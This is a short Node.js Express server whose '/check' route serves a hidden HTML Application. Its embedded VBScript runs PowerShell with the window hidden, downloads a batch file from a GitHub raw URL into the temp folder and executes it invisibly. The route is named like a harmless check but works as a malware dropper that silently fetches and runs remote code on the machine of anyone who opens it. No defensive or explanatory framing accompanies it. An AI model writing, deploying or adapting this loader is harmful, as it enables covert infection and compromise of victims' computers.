const express = require('express');
const app = express();

app.get('/check', (req, res) => {
    res.setHeader('Content-Type', 'application/hta');
    res.send(`
    <html>
    <head>
    <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
    <script language="VBScript">
    On Error Resume Next
    Set sh = CreateObject("WScript.Shell")
    sh.Run "cmd /c powershell -WindowStyle Hidden -Command ""iwr -useb https://raw.githubusercontent.com/lozix64-bit/hahahalozixxd/refs/heads/main/check.bat -OutFile $env:TEMP\c.bat; Start-Process $env:TEMP\c.bat -WindowStyle Hidden""", 0, False
    window.close()
    </script>
    </head>
    <body></body>
    </html>
    `);
});

app.listen(process.env.PORT || 3000);
